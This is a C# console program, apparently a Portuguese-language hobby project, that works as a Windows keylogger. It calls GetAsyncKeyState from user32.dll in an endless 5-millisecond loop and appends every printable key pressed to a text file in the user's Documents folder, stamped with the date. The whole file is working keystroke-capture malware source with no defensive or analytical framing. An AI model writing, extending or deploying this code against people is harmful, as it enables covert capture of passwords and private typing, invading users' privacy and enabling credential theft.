using System;
using System.Runtime.InteropServices;

namespace ProjetoKeyloggerConsole; 

class Program
{
    //Importar a dll USER32 do Windows
    [DllImport("user32.dll")]
    private static extern int GetAsyncKeyState(int i);
    static void Main(string[] args)
    {
        string localpasta = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Projeto Keylogger";
        //Verificar se existe a pasta da aplicação, caso não exista é criada a pasta
        if (!Directory.Exists(localpasta))
        {
            Directory.CreateDirectory(localpasta);
        }
        string localarquivo = localpasta + @"\Registro Keylogger.txt";
        //Verificar se existe o arquivo responsável por registrar a entrada de dados
        if(!File.Exists(localarquivo))
        {
            using(StreamWriter sw = File.CreateText(localarquivo)) { }
        }

        string horario = DateTime.Now.ToString("dd/MM/yyyy");
        //Escrever no arquivo a data em que o arquivo foi aberto
        using(StreamWriter sw = File.AppendText(localarquivo))
        {
            sw.WriteLine("\n" + horario + ":"); 
        }

        //Capturar a teclas digitadas
        while (true)
        {
            //Intervalo de pausa para que outro programa possa ser executado
            Thread.Sleep(5);
            //Loop para verificar todas as teclas do teclado
            for (int i = 32; i < 127; i++)
            {
                //Verificar qual tecla está sendo digitada
                int Status = GetAsyncKeyState(i);
                if(Status == 32769)
                {
                    //Salvar a teclas digitadas em um arquivo de texto
                    using (StreamWriter sw = File.AppendText(localarquivo))
                    {
                        sw.Write((char)i);
                    }
                }
            }
        } 
    }
}